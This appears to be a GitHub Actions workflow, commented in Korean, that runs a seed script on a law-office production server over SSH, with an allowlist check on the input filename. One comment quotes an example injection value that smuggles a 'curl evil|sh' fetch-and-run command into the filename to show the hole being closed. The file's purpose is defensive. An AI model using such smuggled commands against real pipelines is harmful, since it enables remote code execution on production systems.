name: Run seed on production

# 운영서버에서 backend/seeds/<script>.js 를 1회 실행하는 운영 도구.
# 멱등 시드(예: update-lawyer-photos.js) 갱신용. workflow_dispatch 전용.

on:
  workflow_dispatch:
    inputs:
      script:
        description: "실행할 seed 파일명 (backend/seeds/ 기준, 예: update-lawyer-photos.js)"
        required: true
        default: "update-lawyer-photos.js"

env:
  DEPLOY_USER: ubuntu
  DEPLOY_HOST: 15.164.128.160

jobs:
  run-seed:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Setup SSH
        # 시크릿은 ${{ secrets.X }} 직접 보간 대신 env로 전달한다 (deploy.yml과 동일 정책).
        env:
          SSH_KEY: ${{ secrets.LIGHTSAIL_SSH_KEY }}
        run: |
          mkdir -p ~/.ssh
          printf '%s\n' "$SSH_KEY" > ~/.ssh/deploy_key
          chmod 600 ~/.ssh/deploy_key
          ssh-keyscan -t ed25519,rsa -H "$DEPLOY_HOST" >> ~/.ssh/known_hosts 2>&1

      - name: Run seed
        # ${{ inputs.script }} 를 셸 명령에 직접 보간하면 GHA command injection 이 된다.
        # (예: 입력이 `x.js"; curl evil|sh; echo "y` 면 운영서버에서 임의 명령 실행)
        # env로 받아 화이트리스트 검증 후 단일 인용으로 안전하게 SSH 원격 셸에 전달한다.
        env:
          SCRIPT: ${{ inputs.script }}
        run: |
          # 시드 파일명은 영숫자/하이픈/언더스코어/점만 허용, .js 확장자 강제, .. 미포함.
          if ! [[ "$SCRIPT" =~ ^[A-Za-z0-9_-]+\.js$ ]]; then
            echo "invalid script name: $SCRIPT (영숫자/하이픈/언더스코어 + .js 만 허용)"
            exit 1
          fi
          # 원격 셸에서도 안전하도록 단일 인용 컨텍스트 안에 변수를 박는다.
          # SSH 호스트로 보내기 전에 로컬에서 한 번 더 검증되어 있으므로 인젝션 경로는 차단됨.
          ssh -i ~/.ssh/deploy_key -o StrictHostKeyChecking=yes \
            "$DEPLOY_USER@$DEPLOY_HOST" \
            "set -euo pipefail
             cd /home/ubuntu/yjlawoffice/backend
             SCRIPT='$SCRIPT'
             test -f \"seeds/\$SCRIPT\" || { echo \"seed not found: \$SCRIPT\"; exit 1; }
             node \"seeds/\$SCRIPT\""

      - name: Cleanup SSH key
        if: always()
        run: rm -f ~/.ssh/deploy_key
